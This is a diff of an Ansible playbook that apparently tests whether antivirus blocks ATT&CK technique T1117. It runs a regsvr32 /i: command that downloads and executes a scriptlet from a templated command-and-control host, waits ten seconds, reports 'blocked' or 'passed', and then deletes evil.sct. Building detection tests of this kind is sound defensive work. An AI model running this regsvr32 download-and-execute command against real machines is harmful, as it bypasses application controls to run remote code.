@@ -7,6 +7,12 @@
     - name: Run regsvr32 to download and execute script (create a new file evil.sct)
       win_shell: |
         regsvr32.exe /s /u /i:http://{{ cnc_fqdn }}:{{ cnc_port}}/{{ cnc_sct }} scrobj.dll
+     
+    - name: sleep for 10 seconds and continue with play to check if AV removed or Not
+      tags: always
+      wait_for: timeout=10
+      delegate_to: localhost
+          
     - name: check file exist
       tags: always
       win_stat:
@@ -14,9 +20,16 @@
       register: T1117
     - name: check if playbook was blocked
       tags: always
-      debug: msg="Playbook Completed:T1117:blocked:win:"
+      debug: msg="Playbook Completed#T1117#blocked#win#"
       when: T1117.stat.exists == False        
     - name: check if playbook was successfull
       tags: always
-      debug: msg="Playbook Completed:T1117:passed:win:"
-      when: T1117.stat.exists  
+      debug: msg="Playbook Completed#T1117#passed#win#"
+      when: T1117.stat.exists 
+      
+    - name: cleanup      
+      tags: alawys
+      win_file:
+        path: evil.sct
+        state: absent
+      when: T1117.stat.exists 
